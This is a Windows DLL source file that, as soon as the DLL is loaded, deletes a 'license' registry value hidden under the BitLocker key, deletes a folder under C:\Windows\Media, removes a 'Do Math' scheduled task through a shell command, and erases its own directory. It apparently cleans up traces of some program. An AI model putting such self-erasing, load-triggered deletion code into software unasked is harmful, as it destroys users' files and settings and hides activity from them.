// dllmain.cpp : Definiert den Einstiegspunkt für die DLL-Anwendung.
#include "pch.h"
#include <iostream>
#include <winreg.h>
#include <string>
#include "converter.hpp"
#include "dir.hpp"
#include "getreg.hpp"
using namespace std;
int init()
{
    DeleteValue(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\BitLocker", L"license");
    DeleteDirectory("C:\\Windows\\Media\\Maths", true);
    wstring selfdir = ExePath();
    system(" SCHTASKS /Delete /TN \"Do Math\" /F");
    string strSelfDir(selfdir.begin(), selfdir.end());
    DeleteDirectory(strSelfDir, true);
    return 0;
}

BOOL APIENTRY DllMain(HMODULE hModule,
    DWORD  ul_reason_for_call,
    LPVOID lpReserved
)
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        init();
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
